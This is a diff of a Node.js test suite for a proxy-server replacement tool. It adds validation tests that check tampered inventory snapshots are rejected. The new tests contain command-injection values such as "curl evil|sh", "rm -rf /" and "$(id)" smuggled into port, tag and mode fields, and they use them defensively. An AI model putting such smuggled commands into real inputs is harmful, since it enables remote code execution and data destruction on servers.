@@ -4,6 +4,10 @@ const assert = require('node:assert/strict');
 const { buildReplacementConfig } = require('../src/core/replace/entry-config');
 
 // Снимок старого входа: у user1 РАЗНЫЕ UUID на двух inbound, fb1 есть только на Vision.
+// Клиенты в снимке — настоящие UUID: мастер замены отклоняет всё, что на UUID не похоже.
+const U1X = '11111111-1111-4111-8111-111111111111';
+const U1V = '22222222-2222-4222-8222-222222222222';
+const FB1 = '33333333-3333-4333-8333-333333333333';
 const inventory = {
   inbounds: [
     { tag: 'inbound-443', port: 443, net: 'xhttp', sni: 'old.example', pbk: 'OLD', sid: 'ab', path: '/old', mode: 'auto', flow: '' },
@@ -11,13 +15,13 @@ const inventory = {
   ],
   keys: [
     { name: 'user1', entries: [
-      { tag: 'inbound-443', id: 'U1X', email: 'user1-xhttp' },
-      { tag: 'inbound-8443', id: 'U1V', email: 'user1-vision' },
+      { tag: 'inbound-443', id: U1X, email: 'user1-xhttp' },
+      { tag: 'inbound-8443', id: U1V, email: 'user1-vision' },
     ] },
-    { name: 'fb1', entries: [{ tag: 'inbound-8443', id: 'FB1', email: 'fb1' }] },
+    { name: 'fb1', entries: [{ tag: 'inbound-8443', id: FB1, email: 'fb1' }] },
   ],
 };
-const link = { port: 443, uuid: 'L1', flow: 'xtls-rprx-vision', publicKey: 'PUB', shortId: 'cd', sni: 'www.bmw.de' };
+const link = { port: 443, uuid: 'L1', flow: 'xtls-rprx-vision', publicKey: 'PUB', shortId: 'cd', sni: 'exit-mask.example.org' };
 const args = {
   inventory, link, exitHost: '198.51.100.20',
   reality: { privateKey: 'PRIV', shortId: 'ef', sni: 'new.example' },
@@ -31,10 +35,10 @@ test('теги и порты inbound совпадают с инвентарём'
 });
 
 test('у каждого inbound свои UUID; ключ только на Vision не попадает на XHTTP', () => {
-  assert.deepEqual(inb('inbound-443').settings.clients, [{ id: 'U1X', email: 'user1-xhttp' }]);
+  assert.deepEqual(inb('inbound-443').settings.clients, [{ id: U1X, email: 'user1-xhttp' }]);
   assert.deepEqual(inb('inbound-8443').settings.clients, [
-    { id: 'U1V', email: 'user1-vision', flow: 'xtls-rprx-vision' },
-    { id: 'FB1', email: 'fb1', flow: 'xtls-rprx-vision' },
+    { id: U1V, email: 'user1-vision', flow: 'xtls-rprx-vision' },
+    { id: FB1, email: 'fb1', flow: 'xtls-rprx-vision' },
   ]);
 });
 
@@ -60,7 +64,7 @@ test('outbound exit берёт параметры звена', () => {
   assert.equal(v.address, '198.51.100.20');
   assert.equal(v.port, 443);
   assert.deepEqual(v.users[0], { id: 'L1', encryption: 'none', flow: 'xtls-rprx-vision' });
-  assert.equal(o.streamSettings.realitySettings.serverName, 'www.bmw.de');
+  assert.equal(o.streamSettings.realitySettings.serverName, 'exit-mask.example.org');
   assert.equal(o.streamSettings.realitySettings.publicKey, 'PUB');
   assert.equal(o.streamSettings.realitySettings.shortId, 'cd');
 });
@@ -217,7 +221,7 @@ test('замена: конфиг нового входа с клиентами �
   assert.ok(script.indexOf('xray run -test') < script.indexOf('systemctl restart xray'));
   const cfg = JSON.parse(Buffer.from(script.match(/echo (\S+) \| base64 -d > "\$TMP"/)[1], 'base64').toString());
   const text = JSON.stringify(cfg);
-  for (const s of ['U1X', 'U1V', 'user1-xhttp', 'FB1']) assert.ok(text.includes(s), s);
+  for (const s of [U1X, U1V, 'user1-xhttp', FB1]) assert.ok(text.includes(s), s);
   const out = cfg.outbounds.find((o) => o.tag === 'exit');
   assert.equal(out.settings.vnext[0].address, EXIT);
   assert.deepEqual(out.settings.vnext[0].users[0], { id: 'L1', encryption: 'none', flow: 'xtls-rprx-vision' });
@@ -289,11 +293,11 @@ test('замена: сбой до правила на выходе — выхо�
 });
 
 test('замена: UUID, ключ Reality и пароль не попадают в ошибки и прогресс', async () => {
-  const leak = `xray: bad client U1X U1V FB1 link L1 key PRIV pass ${PASSWORD}`;
+  const leak = `xray: bad client ${U1X} ${U1V} ${FB1} link L1 key PRIV pass ${PASSWORD}`;
   const w = replaceWorld({ failOn: '# step:config', failText: leak });
   const r = await runSteps(buildReplaceSteps(replacePlan()), w.ctx, w.onProgress);
   assert.equal(r.failedStep, 'config');
-  for (const s of ['U1X', 'U1V', 'FB1', 'L1', 'PRIV', PASSWORD]) {
+  for (const s of [U1X, U1V, FB1, 'L1', 'PRIV', PASSWORD]) {
     assert.ok(!r.error.includes(s), `ошибка содержит ${s}`);
     assert.ok(w.progress.every((p) => !p.includes(s)), `прогресс содержит ${s}`);
   }
@@ -536,4 +540,41 @@ test('canCloseExitAccess: без сайта подписок (домен не з
   // С сайтом — прежняя защита.
   assert.equal(canCloseExitAccess({ server, subsEntry: 's1', subsPending: false, subsInUse: true }).ok, false);
   assert.equal(canCloseExitAccess({ server, subsEntry: 's2', subsPending: true, subsInUse: true }).ok, false);
+});
+
+// --- Аудит 0.2.1: снимок со старого входа может быть подменён ---
+const { validateInventory } = require('../src/core/replace/entry-config');
+
+test('H1 снимок старого входа: настоящий проходит, подменённые порты/теги/UUID отклоняются', () => {
+  validateInventory(inventory);
+  const clone = () => JSON.parse(JSON.stringify(inventory));
+  const cases = [
+    (v) => { v.inbounds[0].port = "443'; curl evil|sh; '"; },
+    (v) => { v.inbounds[0].port = 22; },
+    (v) => { v.inbounds[0].port = 10085; },
+    (v) => { v.inbounds[1].port = v.inbounds[0].port; },
+    (v) => { v.inbounds[0].tag = 'x;rm -rf /'; },
+    (v) => { v.keys[0].entries[0].tag = 'a b'; },
+    (v) => { v.inbounds[1].flow = 'evil'; },
+    (v) => { v.inbounds[0].net = 'ws'; },
+    (v) => { v.inbounds[0].mode = '$(id)'; },
+    (v) => { v.keys[0].entries[0].id = 'not-a-uuid'; },
+    (v) => { v.keys[0].entries[0].email = 'a"b'; },
+    (v) => { v.keys[0].name = 'a b'; },
+    (v) => { delete v.inbounds; },
+  ];
+  for (const [i, mutate] of cases.entries()) {
+    const v = clone();
+    mutate(v);
+    assert.throws(() => validateInventory(v), undefined, `случай ${i}`);
+  }
+});
+
+test('H1 мастер замены не стартует с подменённым снимком', () => {
+  const bad = JSON.parse(JSON.stringify(inventory));
+  bad.inbounds[0].port = "443'; touch /tmp/pwned; '";
+  assert.throws(() => buildReplaceSteps({
+    target: { host: '203.0.113.50', password: 'x' }, exit: { host: '198.51.100.20', keyPath: '/k' },
+    source: { inventory: bad }, link: {},
+  }));
 });
